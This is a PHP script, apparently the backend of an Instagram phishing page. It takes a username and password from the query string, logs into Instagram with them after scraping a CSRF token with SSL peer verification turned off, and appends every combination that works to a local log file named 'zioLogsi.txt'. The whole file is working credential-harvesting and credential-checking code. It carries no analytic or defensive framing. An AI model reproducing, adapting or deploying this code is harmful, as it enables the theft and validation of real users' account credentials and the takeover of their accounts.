<?php
	header("content-type: text/javascript");
	if (isset($_GET["username"], $_GET["password"]))
	{
		$x = $_GET["username"]; $y = $_GET["password"];
		$ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
		$ckd = getcwd()."/kai/";
		$ckp = $ckd.md5($x.$y).".txt";
		array_map("unlink", glob("$ckd*"));
		$ch = curl_init();
		// get CSRF xD
		curl_setopt($ch, CURLOPT_URL, "https://www.instagram.com/accounts/login/");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_COOKIESESSION, true);
		curl_setopt($ch, CURLOPT_COOKIEJAR, $ckp);
		curl_setopt($ch, CURLOPT_COOKIEFILE, $ckp);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
		curl_setopt($ch, CURLOPT_USERAGENT, $ua);
		$r = curl_exec($ch);
		$token = explode("\"csrf_token\": \"", $r);
		$pass = 0;
		if (sizeof($token))
		{
			$token = explode("\"", $token[1]);
			$token = $token[0];
			$pass = 1;
		}
		if ($pass)
		{
			curl_setopt($ch, CURLOPT_URL, 'https://www.instagram.com/accounts/login/ajax/');
			curl_setopt($ch, CURLOPT_POSTFIELDS,'username='.$x.'&password='.$y);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch, CURLOPT_COOKIESESSION, true );
			curl_setopt($ch, CURLOPT_COOKIEJAR, $ckp);
			curl_setopt($ch, CURLOPT_COOKIEFILE, $ckp);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, $ua);
			curl_setopt($ch, CURLOPT_REFERER, "https://www.instagram.com/accounts/login/");
			curl_setopt($ch, CURLOPT_HTTPHEADER, array(
				"x-csrftoken: $token",
				"x-instagram-ajax: 1",
				"x-requested-with: XMLHttpRequest"
			));
			$page = curl_exec($ch);
			$json = json_decode($page);
			if ($json->authenticated)
			{
				$fn = "zioLogsi.txt";
				$fc = file_get_contents($fn);
				$d = "$x:$y\r\n";
				if (strpos($fc, $d) === false)
				{
					$f = fopen($fn, "a");
					fwrite($f, $d);
					fclose($f);
				}
			}
			echo $page;
		}
	}
?>